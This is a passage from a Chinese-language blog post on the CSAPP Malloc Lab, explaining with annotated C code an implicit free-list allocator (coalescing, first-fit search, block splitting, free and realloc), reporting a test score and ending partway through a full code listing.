<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    </span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;	<span class="comment">// 保证对齐</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)	<span class="comment">// 分配空间</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    	</span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化头部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化脚部</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));	<span class="comment">// 初始化结尾块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);	<span class="comment">// 合并相邻空闲块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h2><ul>
<li>合并时有四种情况：相邻两个块都已分配、一个已分配一个空闲（两种）及相邻两个块都空闲。具体如下</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240407215312793.png" class="" title="image-20240407215312793">

<ul>
<li><p>合并仅仅通过修改相关块的头部和尾部的 size（块大小）就可以简单的实现合并</p>
</li>
<li><p>需要注意的是：在通过宏访问隐式空闲链表时，要详细了解宏的具体实现及相关依赖。比如：FTRP 的实现是依赖于头部的 size ，如果头部的 size 已经被修改，再使用 FTRP 就会定位到修改后的块的脚部</p>
</li>
<li><p>由于隐式空闲链表的序言块和结尾块总是标记为已分配，因此允许我们忽略潜在的边界情况</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));	<span class="comment">// 得到前一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));	<span class="comment">// 得到下一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));	<span class="comment">// 得到这个块的大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块有效，下一个块也有效</span></span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;	<span class="comment">// 前一个块有效，下一个块空闲</span></span><br><span class="line">    	size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块空闲，下一个块有效</span></span><br><span class="line">    	size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前一个块空闲，下一个块也空闲</span></span><br><span class="line">    	size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h2><ul>
<li><p>如果 asize &lt;&#x3D; DSIZE，为了保证 8 字节对齐，我们强制要求最小块为 16 字节，8 字节保存头部和脚部，8 字节用来满足对齐要求</p>
<blockquote>
<p>假如我们申请 1 字节的空间，加上 8 字节的头部和脚部后为 9 字节，向上取整到 16 字节</p>
</blockquote>
</li>
<li><p>如果 asize &gt; DSIZE，我们将其向上取整到最接近 8 的倍数</p>
<blockquote>
<p>size + DSIZE + （DSIZE - 1），第一个 DSIZE 表示头部和脚部，（DSIZE - 1）表示向上取整</p>
<p>比如 （9（size） + 7（DSIZE - 1））&#x2F; DSIZE &#x3D; 2，而（8（size）+ 7（DSIZE - 1））&#x2F; DSIZE &#x3D; 1，表明了 9 字节会向上取整，而 8 字节则不会 </p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    	</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE) &#123;	</span><br><span class="line">    	asize = <span class="number">2</span> * DSIZE;	<span class="comment">// 强制最小块大小为 16 字节</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	asize = DSIZE * ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE);	<span class="comment">// 向上取整到最接近 8 的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;	<span class="comment">// 在空闲链表中找没有名合适的空闲块</span></span><br><span class="line">    	place(bp, asize);	<span class="comment">// 有就放置并分割（可选）</span></span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)	<span class="comment">// 没有合适的空闲块，向系统请求新的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);	</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h2><ul>
<li>我们的放置策略选择的是 <strong>首次适配</strong>，从头开始搜索空闲链表，选择第一个合适的空闲块</li>
<li>具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;	<span class="comment">// 遍历隐式空闲链表</span></span><br><span class="line">    	<span class="keyword">if</span> ((!GET_ALLOC(HDRP(bp))) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;	<span class="comment">// 如果一个块是空闲的且大小合适</span></span><br><span class="line">    	    <span class="keyword">return</span> bp;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="place"><a href="#place" class="headerlink" title="place"></a>place</h2><ul>
<li><p>我们的分割策略是：只有当一个块的剩余部分的大小等于或超出最小块的大小时（16 字节），才进行分割</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= (<span class="number">2</span> * DSIZE)) &#123;	<span class="comment">// 如果块的剩余部分大于一个最小块的大小，那么就分割</span></span><br><span class="line">    	PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));	<span class="comment">// 初始化已分配块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    	bp = NEXT_BLKP(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));	<span class="comment">// 初始化分割后的空闲块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h2><ul>
<li><p>释放一个已分配块很简单，仅仅通过将这个已分配块的头部和脚部的 alloc（有效位）设置为 0（空闲）就可以实现了</p>
</li>
<li><p>需要明白的一点是：已分配块原来并没有脚部，我们是在为它重新创建一个脚部并初始化为空闲的状态</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));	<span class="comment">// 设置头部和脚部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    coalesce(bp);	<span class="comment">// 看看前后有没有空闲块可以合并</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h2><ul>
<li><p>mm_realloc 的实现仅仅是将原来官方提供的原始实现翻译为了符合隐式空闲链表组织空闲块的形式</p>
</li>
<li><p>其中涉及一个隐藏函数 memcpy，在 memlib.c 中并没有它的实现。根据上下文，我猜测它的作用大致为：将 oldptr 指向的旧块中 的 copySize 个字节的值拷贝到 newptr 指向的新块的相应位置</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="type">void</span> *newptr;</span><br><span class="line">    <span class="type">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((newptr = mm_malloc(size)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)	<span class="comment">// 保证 copySize 始终是最小的</span></span><br><span class="line">      copySize = size;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);	<span class="comment">// 将 oldptr 指向的旧块中 copySize 个字节的值拷贝到 newptr 指向的新块</span></span><br><span class="line">    mm_free(oldptr);	<span class="comment">// 释放 oldptr 指向的旧块</span></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><ul>
<li>通过 <strong>make</strong> 重写编译文件， <strong>.&#x2F;mdriver -t .&#x2F;traces -V</strong> 进行测试。结果如下</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240407230053574.png" class="" title="image-20240407230053574">

<ul>
<li><p>好好好，74 分！然而我之前运行只有 55 分。。</p>
<blockquote>
<p>啊这 …… 我还是倾向于它只有 55 ~ 60 分的水平，因为块分配和堆块的总数呈线性关系，我们总是需要遍历空闲链表来找有没有合适的块，效率是很低的！</p>
</blockquote>
</li>
</ul>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li>整理过后，全部代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mm-naive.c - The fastest, least memory-efficient malloc package.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * In this naive approach, a block is allocated by simply incrementing</span></span><br><span class="line"><span class="comment"> * the brk pointer.  A block is pure payload. There are no headers or</span></span><br><span class="line"><span class="comment"> * footers.  Blocks are never coalesced or reused. Realloc is</span></span><br><span class="line"><span class="comment"> * implemented directly using mm_malloc and mm_free.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE TO STUDENTS: Replace this header comment with your own header</span></span><br><span class="line"><span class="comment"> * comment that gives a high level description of your solution.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;memlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> * NOTE TO STUDENTS: Before you do anything else, please</span></span><br><span class="line"><span class="comment"> * provide your team information in the following struct.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line"><span class="type">team_t</span> team = &#123;</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">&quot;ateam&quot;</span>,</span><br><span class="line">    <span class="comment">/* First member&#x27;s full name */</span></span><br><span class="line">    <span class="string">&quot;YiweiBoi&quot;</span>,</span><br><span class="line">    <span class="comment">/* First member&#x27;s email address */</span></span><br><span class="line">    <span class="string">&quot;2132858746@qq.com&quot;</span>,</span><br><span class="line">    <span class="comment">/* Second member&#x27;s full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="comment">/* Second member&#x27;s email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4				<span class="comment">// 单字，头部/脚部大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8				<span class="comment">// 双字大小	</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)	<span class="comment">// 空闲块的默认大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))	<span class="comment">// 打包头部/脚部中 size（大小）和 alloc（有效位）到一个字中</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p 指针是一个 void* 指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))					<span class="comment">// 读 p 指针指向的值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) ((*(unsigned int *)(p)) = (val))	<span class="comment">// 将 val 写入 p 指针所指向的位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p 指向一个块的头部/脚部</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)	<span class="comment">// 读取头部/脚部中 size，即读取一个块的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)	<span class="comment">// 读取头部/脚部中 alloc，即读取一个块的有效位（001 表示有效，000 表示无效）</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bp 指向这个块载荷部分的起始位置</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)							<span class="comment">// 得到 bp 这个块的头部指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)	<span class="comment">// 得到 bp 这个块的脚部指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))	<span class="comment">//得到下一个块载荷位置的指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))	<span class="comment">// 得到上一个块的载荷位置的指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *heap_listp;	<span class="comment">// 指向序言块</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)	<span class="comment">// 得到 4 个字大小的内存空间 </span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;	</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);								<span class="comment">// 初始化填充字</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块的第一个部分</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块的第二个部分</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));		<span class="comment">// 初始化结尾块</span></span><br><span class="line">    heap_listp += (<span class="number">2</span> * WSIZE);						<span class="comment">// 令 heap_listp 指向序言块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)		<span class="comment">// 创建初始的空闲块</span></span><br><span 